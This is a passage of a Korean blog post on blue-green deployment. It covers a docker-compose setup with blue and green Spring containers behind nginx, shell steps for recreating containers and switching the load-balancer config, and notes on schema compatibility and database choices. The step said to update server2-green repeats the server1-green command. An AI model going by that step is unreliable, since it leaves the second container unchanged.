    &lt;span class=&quot;na&quot;&gt;ports&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;80:80&quot;&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;volumes&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;./loadbalancer-nginx-blue.conf:/etc/nginx/sites-available/loadbalancer-nginx-blue.conf&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;./loadbalancer-nginx-green.conf:/etc/nginx/sites-available/loadbalancer-nginx-green.conf&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;depends_on&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;server1-blue&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;server1-green&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;server2-blue&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;server2-green&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;extra_hosts&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;host.docker.internal:host-gateway&quot;&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;networks&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;plain-deployment-net&lt;/span&gt;  
                
                
  &lt;span class=&quot;na&quot;&gt;server1-blue&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;server-blue:0.0.1&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;container_name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;server1-blue&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;java&quot;&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;-jar&quot;&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/spring.jar&quot;&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;--deployment=blue&quot;&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;networks&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;plain-deployment-net&lt;/span&gt;  
                
                
  &lt;span class=&quot;na&quot;&gt;server1-green&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
    &lt;span class=&quot;c1&quot;&gt;# | -- 수정 시작 -- |&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;server-green:0.0.2&lt;/span&gt;  
    &lt;span class=&quot;c1&quot;&gt;# | -- 수정 끝 -- |&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;container_name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;server1-green&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;java&quot;&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;-jar&quot;&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/spring.jar&quot;&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;--deployment=green&quot;&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;networks&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;plain-deployment-net&lt;/span&gt;  
                
                
  &lt;span class=&quot;na&quot;&gt;server2-blue&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;server-blue:0.0.1&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;container_name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;server2-blue&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;java&quot;&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;-jar&quot;&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/spring.jar&quot;&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;--deployment=blue&quot;&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;networks&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;plain-deployment-net&lt;/span&gt;  
                
                
  &lt;span class=&quot;na&quot;&gt;server2-green&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
    &lt;span class=&quot;c1&quot;&gt;# | -- 수정 시작 -- |&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;server-green:0.0.2&lt;/span&gt;  
    &lt;span class=&quot;c1&quot;&gt;# | -- 수정 끝 -- |&lt;/span&gt;
    &lt;span class=&quot;na&quot;&gt;container_name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;server2-green&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;java&quot;&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;-jar&quot;&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;/spring.jar&quot;&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;--deployment=green&quot;&lt;/span&gt;  
    &lt;span class=&quot;na&quot;&gt;networks&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;plain-deployment-net&lt;/span&gt;  
                
                
&lt;span class=&quot;na&quot;&gt;networks&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
  &lt;span class=&quot;na&quot;&gt;plain-deployment-net&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;  
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
      &lt;/li&gt;
      &lt;li&gt;sever1-green에 변경 사항 적용&lt;br /&gt;
(server1-green 컨테이너 이미지를 server-green:0.0.2 로 변경)
        &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;docker-compose up &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--no-deps&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--force-recreate&lt;/span&gt; server1-green  
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
      &lt;/li&gt;
      &lt;li&gt;server2-green에 변경 사항 적용&lt;br /&gt;
(server2-green 컨테이너 이미지를 server-green:0.0.2 로 변경)
        &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;docker-compose up &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--no-deps&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--force-recreate&lt;/span&gt; server1-green  
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
      &lt;/li&gt;
      &lt;li&gt;테스트
        &lt;ul&gt;
          &lt;li&gt;sever1-green, sever2-green 컨테이너에 적용된&lt;br /&gt;
이미지가 잘 교체되었는지 확인
            &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;docker ps | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;green  | &lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'s/  */ /g'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'{ print $2, $12 }'&lt;/span&gt;  
                    
&lt;span class=&quot;c&quot;&gt;## 결과가 아래와 같이 나와야 함  &lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# server-green:0.0.2 server2-green  &lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# server-green:0.0.2 server1-green  &lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;            &lt;/div&gt;
          &lt;/li&gt;
          &lt;li&gt;브라우저에서 http://localhost/green 으로 들어가 &lt;br /&gt;
green 문자열이 나오는지 확인&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;로드밸런서 nginx에서 트래픽을 그린으로 분배하도록 변경
        &lt;ul&gt;
          &lt;li&gt;명령
            &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
2
3
4
5
6
7
&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;docker compose &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; ./docker-compose.yml &lt;span class=&quot;nb&quot;&gt;exec &lt;/span&gt;loadbalancer sh &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;  
  mv /etc/nginx/conf.d/default.conf /etc/nginx/conf.d/default.conf.bak   
  rm -rf /etc/nginx/conf.d/*.conf  
  ln -s /etc/nginx/sites-available/loadbalancer-nginx-green.conf /etc/nginx/conf.d/  
  nginx -t  
  nginx -s reload  
&quot;&lt;/span&gt;  
&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;            &lt;/div&gt;
          &lt;/li&gt;
          &lt;li&gt;확인
            &lt;ul&gt;
              &lt;li&gt;브라우저에서 http://localhost 으로 들어가 &lt;br /&gt;
green 문자열이 나오는지 확인&lt;/li&gt;
            &lt;/ul&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;주의할-점&quot;&gt;주의할 점&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;블루-그린 데이터 동기화를 위해 &lt;br /&gt;
두 버전에 호환되게 스키마를 운영해야한다.
    &lt;ul&gt;
      &lt;li&gt;기존 컬럼 삭제
        &lt;ul&gt;
          &lt;li&gt;버전 배포 전까지 기존 컬럼을 DB에서 바로 삭제하지 않고, &lt;br /&gt;
애플리케이션에서만 제거&lt;/li&gt;
          &lt;li&gt;오랜 시간 운영 후, 해당 컬럼을 참조하는 코드가 &lt;br /&gt;
완전히 제거된 다음 버전이 배포되면 DB에서 컬럼 삭제&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;컬럼 수정 (VARCHAR → JSON 예시)
        &lt;ul&gt;
          &lt;li&gt;새로운 컬럼(contents_new) 추가 (기존 contents 컬럼 유지)&lt;/li&gt;
          &lt;li&gt;기존 데이터를 contents_new로 마이그레이션&lt;/li&gt;
          &lt;li&gt;새 버전 애플리케이션에서 contents_new 컬럼을 사용하도록 수정&lt;/li&gt;
          &lt;li&gt;충분한 운영 후 contents 컬럼이 더 이상 사용되지 않으면 삭제&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;블루-그린 배포에서 DB 사용 방식
    &lt;ul&gt;
      &lt;li&gt;하나의 DB 사용
        &lt;ul&gt;
          &lt;li&gt;트래픽 변경 시 애플리케이션만 전환하면 되므로 편리하다.&lt;/li&gt;
          &lt;li&gt;대규모 테이블 변경 시 라이브 서비스에 영향 가능성이 있다.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;별도의 DB 사용
        &lt;ul&gt;
          &lt;li&gt;새 버전 배포 시 기존 서비스(DB)에 영향을 주지 않는다.&lt;/li&gt;
          &lt;li&gt;두 버전이 서로 다른 DB를 사용하므로 &lt;br /&gt;
데이터 동기화를 위한 CDC(Kafka Connect 등) 필요하다.&lt;/li&gt;
          &lt;li&gt;DB가 버전 별로 필요하고 CDC도 사용해야 하므로&lt;br /&gt;
리소스 소비가 상대적으로 많다.&lt;/li&gt;
          &lt;li&gt;동기화 문제로 인해 롤백이 더 복잡하다.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;예시-repository&quot;&gt;예시 repository&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/a3magic3pocket/blue-green-deployment-sandbox&quot; target=&quot;_blank&quot;&gt;blue-green-deployment-sandbox&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><author><name></name></author><category term="Deployment" /><category term="blue-green" /><category term="essay" /><summary type="html">블루 - 그린 배포란? 두 개의 동일한 환경(블루와 그린)을 유지하며, 새 버전을 배포한 후 트래픽을 전환하여 새로운 버전을 운영에 적용</summary></entry></feed>